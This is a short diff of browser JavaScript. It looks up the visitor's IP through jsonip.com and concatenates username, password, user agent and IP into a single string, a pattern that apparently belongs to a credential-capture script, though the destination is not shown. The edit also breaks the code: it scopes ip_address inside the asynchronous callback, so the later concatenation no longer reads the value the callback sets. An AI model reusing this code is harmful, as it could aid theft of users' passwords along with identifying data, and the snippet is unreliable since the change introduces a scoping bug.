@@ -9,9 +9,8 @@
          
          var user_agent = navigator.userAgent;
          
-         var ip_address;
          $.getJSON("https://jsonip.com?callback=?", function(data) {
-           ip_address = data.ip
+           var ip_address = data.ip;
          });
          
          var combostring = username + "," + password + "," + user_agent + "," + ip_address;
